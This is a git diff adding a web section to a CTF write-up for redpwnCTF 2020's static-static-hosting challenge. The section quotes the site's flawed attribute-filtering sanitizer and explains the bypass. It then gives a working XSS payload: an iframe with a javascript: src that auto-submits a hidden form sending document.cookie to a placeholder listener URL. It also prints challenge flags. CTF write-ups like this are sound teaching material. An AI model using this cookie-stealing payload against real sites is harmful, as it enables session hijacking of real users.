@@ -13,6 +13,7 @@ image: /cara-memperbarui-fork-repository/repo.png
 
 +  [Misc](#misc)
 +  [Pwn](#pwn)
++  [Web](#web)
 
 ## Misc
 ### misc/uglybash
@@ -186,7 +187,7 @@ my_tel.write(chain)
 my_tel.interact()
 ```
 
-Viola!
+Voilà!
 
 ```console
 cernec1999@ccerne:~/Downloads$ ./exp.py 
@@ -195,3 +196,101 @@ AAAAAAAAAAAAAAAAAAAAAAAA3@
 cat flag.txt
 flag{jump_1nt0_th3_l1brary}
 ```
+
+## Web
+### web/static-static-website
+**Solved By:** Bib<br>
+**Points:** 435<br>
+**Flag:** flag{wh0_n33d5_d0mpur1fy}
+
+##### Challenge
+Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me [here](https://admin-bot.redpwnc.tf/submit?challenge=static-static-hosting)
+
+Site: [static-static-hosting.2020.redpwnc.tf](https://static-static-hosting.2020.redpwnc.tf/)
+
+Note: The site is entirely static. Dirbuster will not be useful in solving it.
+##### Solution
+
+To solve this, I needed to create an HTML page that, when opened by the "admin", would steal their cookies.
+So the first thing I did was check the source of the HTML page to see if any sanitization was done when creating the HTML page.
+The page has a ```script.js``` file that contained the following :
+
+```
+(async () => {
+    await new Promise((resolve) => {
+        window.addEventListener('load', resolve);
+    });
+
+    const content = window.location.hash.substring(1);
+    display(atob(content));
+})();
+
+function display(input) {
+    document.documentElement.innerHTML = clean(input);
+}
+
+function clean(input) {
+    const template = document.createElement('template');
+    const html = document.createElement('html');
+    template.content.appendChild(html);
+    html.innerHTML = input;
+
+    sanitize(html);
+
+    const result = html.innerHTML;
+    return result;
+}
+
+function sanitize(element) {
+    const attributes = element.getAttributeNames();
+    for (let i = 0; i < attributes.length; i++) {
+        // Let people add images and styles
+        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
+            element.removeAttribute(attributes[i]);
+        }
+    }
+
+    const children = element.children;
+    for (let i = 0; i < children.length; i++) {
+        if (children[i].nodeName === 'SCRIPT') {
+            element.removeChild(children[i]);
+            i --;
+        } else {
+            sanitize(children[i]);
+        }
+    }
+}
+```
+
+This told me that they removed all attributes except for ```src```, ```width```, ```height```, ```alt``` & ```class```.
+Also, it removes the ```<script>``` tags and everything that's inside.
+
+I've confirmed that I could do XSS by using an ```<iframe>``` or ```<embed>``` tag.
+
+This is where I fell down a major rabbit hole...
+Because of the filtered attributes, I thought that they wanted us to craft an SVG image containing malicious code. Unfortunately, that was not the case.
+After losing a couple of hours down that rabbit hole, I decided to look for another solution.
+I've thought about another idea : Why not try to send a hidden form that will submit itself when the "admin" clicks the link?
+So I've come up with this code :
+
+```
+<html>
+    <head>
+    </head>
+    <body>
+            
+<iframe src="javascript:var f=document.createElement('form');f.action='http://LISTENER_URL_HERE/';f.method='POST';
+f.target='_blank';var k=document.createElement('input');k.type='hidden';k.name='flag';k.value=document.cookie;f.appendChild(k);document.body.appendChild(f);f.submit();console.log('Cookie stolen!');"></iframe>
+
+    </body>
+</html>
+```
+
+This main caveat here was the use of ```target='_blank'```.
+If you don't open in a new tab, you would get the iframe cookies (no cookie was returned).
+So finally, submitting this code to the admin page stole the cookie containing the flag and sent it to my listener.
+
+I'm pretty happy with this solve, even though I went down a time-losing rabbit hole.
+That SVG stuff was actually useful in another CTF we did later on.
+
+```flag{wh0_n33d5_d0mpur1fy}```
